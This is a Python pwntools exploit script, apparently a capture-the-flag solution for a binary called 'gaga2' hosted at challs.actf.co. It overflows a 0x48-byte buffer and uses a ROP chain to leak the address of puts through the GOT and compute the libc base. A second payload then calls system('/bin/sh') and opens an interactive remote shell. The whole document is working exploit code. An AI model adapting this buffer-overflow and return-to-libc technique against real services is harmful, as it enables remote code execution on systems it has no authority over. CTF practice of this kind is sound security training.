import sys
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('./gaga2')

if sys.argv[1] == 'local':
    p = process('./gaga2')
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('challs.actf.co', '31302')
    libc = ELF('./libc.so.6') # 从Dockerfile对应的镜像中复制出来的

pause()

pop_rdi_ret = 0x00000000004012b3
start_addr = 0x004010f0
bss_addr = 0x404070
payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    start_addr
)
p.sendlineafter(b'Your input: ', payload)

put_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc.address = put_addr - libc.sym['puts']

system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
pop_rsi_r15_ret = 0x00000000004012b1
ret_addr = 0x000000000040101a

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    bin_sh_addr,
    ret_addr,
    system_addr,
)

p.sendlineafter(b'Your input: ', payload)

p.interactive()